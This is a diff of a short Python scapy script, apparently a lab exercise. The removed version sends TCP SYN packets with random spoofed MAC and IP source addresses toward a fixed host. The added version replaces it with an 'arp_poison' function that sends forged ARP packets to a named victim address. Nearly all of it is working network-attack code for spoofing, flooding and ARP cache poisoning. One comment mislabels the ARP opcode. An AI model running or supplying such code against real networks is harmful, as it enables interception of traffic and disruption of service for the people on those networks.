@@ -1,10 +1,10 @@
 import random
 import time
 
-from scapy.all import Ether, IP, TCP, sendp
+from scapy.all import Ether, ARP, sendp, send
 
 
-def generate_mac_address() -> str:
+def generate_mac() -> str:
     mac_address = ""
 
     for i in range(6):
@@ -20,7 +20,7 @@ def generate_mac_address() -> str:
     return mac_address
 
 
-def generate_ip_address() -> str:
+def generate_ip() -> str:
     ip_address = ""
 
     for i in range(4):
@@ -40,23 +40,25 @@ def generate_tcp_flag() -> str:
 
     return random.choice(flags)
 
+def arp_poison(victim_ip: str, 
+               victim_mac: str, 
+               attacker_ip: str, 
+               attacker_mac: str):
 
-ethernet = Ether()
-ip = IP()
-tcp = TCP()
+    arp = ARP()
 
-ethernet.dst = "08:00:27:47:3b:dc"
-ip.dst = "192.168.56.102"
-ip.dport = 80
+    arp.hwsrc = attacker_mac
+    arp.hwdst = victim_mac
+    arp.psrc = attacker_ip
+    arp.pdst = victim_ip
 
-while True:
-    ethernet.src = generate_mac_address()
-    ip.src = generate_ip_address()
+    arp.op = 1 # ARP Reply
+    arp.show()
 
-    tcp.flags = "S"
+    send(arp)
+ 
 
-    p = ethernet / ip / tcp
-
-    sendp(p)
-
-    break
+arp_poison(victim_ip="192.168.56.102",
+           victim_mac="08:00:27:47:3b:dc",
+           attacker_ip=generate_ip(),
+           attacker_mac=generate_mac())
